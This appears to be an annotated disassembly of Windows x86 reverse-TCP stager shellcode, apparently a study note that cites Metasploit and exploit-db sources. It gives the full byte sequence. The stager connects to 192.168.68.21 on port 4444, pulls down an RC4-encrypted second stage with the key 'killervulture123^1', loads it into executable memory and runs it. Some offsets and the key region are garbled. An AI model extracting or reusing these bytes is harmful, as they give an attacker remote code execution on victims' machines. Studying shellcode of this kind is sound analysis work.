0:  e8 82 00 00 00          call   0x87
5:  60                      pusha
6:  89 e5                   mov    ebp,esp
8:  31 c0                   xor    eax,eax
a:  64 8b 50 30             mov    edx,DWORD PTR fs:[eax+0x30]
e:  8b 52 0c                mov    edx,DWORD PTR [edx+0xc]
11: 8b 52 14                mov    edx,DWORD PTR [edx+0x14]
14: 8b 72 28                mov    esi,DWORD PTR [edx+0x28]
17: 0f b7 4a 26             movzx  ecx,WORD PTR [edx+0x26]
1b: 31 ff                   xor    edi,edi
1d: ac                      lods   al,BYTE PTR ds:[esi]
1e: 3c 61                   cmp    al,0x61
20: 7c 02                   jl     0x24
22: 2c 20                   sub    al,0x20
24: c1 cf 0d                ror    edi,0xd
27: 01 c7                   add    edi,eax
29: e2 f2                   loop   0x1d
2b: 52                      push   edx
2c: 57                      push   edi
2d: 8b 52 10                mov    edx,DWORD PTR [edx+0x10]
30: 8b 4a 3c                mov    ecx,DWORD PTR [edx+0x3c]
33: 8b 4c 11 78             mov    ecx,DWORD PTR [ecx+edx*1+0x78]
37: e3 48                   jecxz  0x81
39: 01 d1                   add    ecx,edx
3b: 51                      push   ecx
3c: 8b 59 20                mov    ebx,DWORD PTR [ecx+0x20]
3f: 01 d3                   add    ebx,edx
41: 8b 49 18                mov    ecx,DWORD PTR [ecx+0x18]
44: e3 3a                   jecxz  0x80
46: 49                      dec    ecx
47: 8b 34 8b                mov    esi,DWORD PTR [ebx+ecx*4]
4a: 01 d6                   add    esi,edx
4c: 31 ff                   xor    edi,edi
4e: ac                      lods   al,BYTE PTR ds:[esi]
4f: c1 cf 0d                ror    edi,0xd
52: 01 c7                   add    edi,eax
54: 38 e0                   cmp    al,ah
56: 75 f6                   jne    0x4e
58: 03 7d f8                add    edi,DWORD PTR [ebp-0x8]
5b: 3b 7d 24                cmp    edi,DWORD PTR [ebp+0x24]
5e: 75 e4                   jne    0x44
60: 58                      pop    eax
61: 8b 58 24                mov    ebx,DWORD PTR [eax+0x24]
64: 01 d3                   add    ebx,edx
66: 66 8b 0c 4b             mov    cx,WORD PTR [ebx+ecx*2]
6a: 8b 58 1c                mov    ebx,DWORD PTR [eax+0x1c]
6d: 01 d3                   add    ebx,edx
6f: 8b 04 8b                mov    eax,DWORD PTR [ebx+ecx*4]
72: 01 d0                   add    eax,edx
74: 89 44 24 24             mov    DWORD PTR [esp+0x24],eax
78: 5b                      pop    ebx
79: 5b                      pop    ebx
7a: 61                      popa
7b: 59                      pop    ecx
7c: 5a                      pop    edx
7d: 51                      push   ecx
7e: ff e0                   jmp    eax
80: 5f                      pop    edi
81: 5f                      pop    edi
82: 5a                      pop    edx
83: 8b 12                   mov    edx,DWORD PTR [edx]
85: eb 8d                   jmp    0x14
87: 5d                      pop    ebp
88: 68 33 32 00 00          push   0x3233      ; Push the bytes 'ws2_32',0,0 onto the stack.
8d: 68 77 73 32 5f          push   0x5f327377  ;  ...
92: 54                      push   esp         ; Push a pointer to the "ws2_32" string on the stack.
93: 68 4c 77 26 07          push   0x726774c    hash( "kernel32.dll", "LoadLibraryA" )
98: ff d5                   call   ebp         ; LoadLibraryA( "ws2_32" )
9a: b8 90 01 00 00          mov    eax,0x190   ; EAX = sizeof( struct WSAData )
9f: 29 c4                   sub    esp,eax     ; alloc some space for the WSAData structure    
e0: 54                      push   esp         ; ?
a1: 54                      push   esp         ; push a pointer to this stuct
a2: 50                      push   eax         ; push the wVersionRequested parameter 
a3: 68 29 80 6b 00          push   0x6b8029     hash( "ws2_32.dll", "WSAStartup" )
a8: ff d5                   call   ebp         ;  WSAStartup( 0x0190, &WSAData );
aa: 50                      push   eax         ; if we succeed, eax wil be zero, push zero for the flags param.
ab: 50                      push   eax         ; push null for reserved parameter
ac: 50                      push   eax         ; we do not specify a WSAPROTOCOL_INFO structure
ad: 50                      push   eax         ; we do not specify a protocol
ae: 40                      inc    eax         ; 
af: 50                      push   eax         ;push SOCK_STREAM
b0: 40                      inc    eax         ;
b1: 50                      push   eax         ; push AF_INET           
b2: 68 ea 0f df e0          push   0xe0df0fea    hash( "ws2_32.dll", "WSASocketA" )
b7: ff d5                   call   ebp         ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
b9: 97                      xchg   edi,eax     ; save the socket for later, don't care about the value of eax after this
ba: 6a 05                   push   0x5         ; retry counter
bc: 68 c0 a8 44 15          push   0x1544a8c0  ; 192.168.68.21
											   ; push 0x0100007F        ; host 127.0.0.1 ; 68 7F 00 00 01

													// https://www.exploit-db.com/exploits/42339
													 https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm
													// sin_port and sin_family (4444, 0x0002)  - https://coffeegist.com/security/slae-exam-5-shellcode-analysis-part-3/


c1: 68 02 00 11 5c          push   0x5c110002   ; family AF_INET and port 4444
c6: 89 e6                   mov    esi,esp      ; save pointer to sockaddr struct
c8: 6a 10                   push   0x10         ; length of the sockaddr struct
ca: 56                      push   esi          ; pointer to the sockaddr struct
cb: 57                      push   edi          ; the socket
cc: 68 99 a5 74 61          push   0x6174a599   "ws2_32.dll!connect"
d1: ff d5                   call   ebp          connect( s, &sockaddr, 16 );
d3: 85 c0                   test   eax,eax      ; non-zero means a failure
d5: 74 0c                   je     0xe3
d7: ff 4e 08                dec    DWORD PTR [esi+0x8]
da: 75 ec                   jne    0xc8
dc: 68 f0 b5 a2 56          push   0x56a2b5f0    "kernel32.dll!ExitProcess"
e1: ff d5                   call   ebp        
e3: 6a 00                   push   0x0            ; flags
e5: 6a 04                   push   0x4            ; length
e7: 56                      push   esi            ;  A pointer to the buffer to receive the incoming data.
e8: 57                      push   edi            ; the saved socket
e9: 68 02 d9 c8 5f          push   0x5fc8d902     "ws2_32.dll!recv" 
ee: ff d5                   call   ebp
f0: 8b 36                   mov    esi,DWORD PTR [esi]
f2: 81 f6 4b 58 4f 52       xor    esi,0x524f584b
f8: 8d 0e                   lea    ecx,[esi]
fa: 6a 40                   push   0x40                  ; flProtect  - PAGE_EXECUTE_READWRITE
fc: 68 00 10 00 00          push   0x1000                ; flAllocationType - MEM_COMMIT
101:    51                      push   ecx               ; dwSize
102:    6a 00                   push   0x0               ;      lpAddress - The starting address of the region to allocate.
104:    68 58 a4 53 e5          push   0xe553a458        "kernel32.dll!VirtualAlloc"   
109:    ff d5                   call   ebp
10b:    8d 98 00 01 00 00       lea    ebx,[eax+0x100]
111:    53                      push   ebx
112:    56                      push   esi
113:    50                      push   eax
114:    6a 00                   push   0x0               ; flags
116:    56                      push   esi               ; length
117:    53                      push   ebx               ;  A pointer to the buffer to receive the incoming data.
118:    57                      push   edi               ; the saved socket
119:    68 02 d9 c8 5f          push   0x5fc8d902        "ws2_32.dll!recv"
11e:    ff d5                   call   ebp
120:    01 c3                   add    ebx,eax
122:    29 c6                   sub    esi,eax
124:    75 ee                   jne    0x114
126:    5b                      pop    ebx
127:    59                      pop    ecx
128:    5d                      pop    ebp
129:    55                      push   ebp
12a:    57                      push   edi
12b:    89 df                   mov    edi,ebx
12d:    e8 10 00 00 00          call   0x142

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                  "killervulture123^1"
132:    6b 69 6c 6c             imul   ebp,DWORD PTR [ecx+0x6c],0x6c
136:    65 72 76                gs jb  0x1af
139:    75 6c                   jne    0x1a7
13b:    74 75                   je     0x1b2
13d:    72 65                   jb     0x1a4
13f:    31 32                   xor    DWORD PTR [edx],esi
141:    33 5e 31                xor    ebx,DWORD PTR [esi+0x31]
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
144:    c0 aa fe c0 75 fb 81    shr    BYTE PTR [edx-0x48a3f02],0x81
14b:    ef                      out    dx,eax
14c:    00 01                   add    BYTE PTR [ecx],al
14e:    00 00                   add    BYTE PTR [eax],al
150:    31 db                   xor    ebx,ebx
152:    02 1c 07                add    bl,BYTE PTR [edi+eax*1]
155:    89 c2                   mov    edx,eax
157:    80 e2 0f                and    dl,0xf
15a:    02 1c 16                add    bl,BYTE PTR [esi+edx*1]
15d:    8a 14 07                mov    dl,BYTE PTR [edi+eax*1]
160:    86 14 1f                xchg   BYTE PTR [edi+ebx*1],dl
163:    88 14 07                mov    BYTE PTR [edi+eax*1],dl
166:    fe c0                   inc    al
168:    75 e8                   jne    0x152
16a:    31 db                   xor    ebx,ebx
16c:    fe c0                   inc    al
16e:    02 1c 07                add    bl,BYTE PTR [edi+eax*1]
171:    8a 14 07                mov    dl,BYTE PTR [edi+eax*1]
174:    86 14 1f                xchg   BYTE PTR [edi+ebx*1],dl
177:    88 14 07                mov    BYTE PTR [edi+eax*1],dl
17a:    02 14 1f                add    dl,BYTE PTR [edi+ebx*1]
17d:    8a 14 17                mov    dl,BYTE PTR [edi+edx*1]
180:    30 55 00                xor    BYTE PTR [ebp+0x0],dl
183:    45                      inc    ebp
184:    49                      dec    ecx
185:    75 e5                   jne    0x16c
187:    5f                      pop    edi
188:    c3                      ret
189:    51                      push   ecx
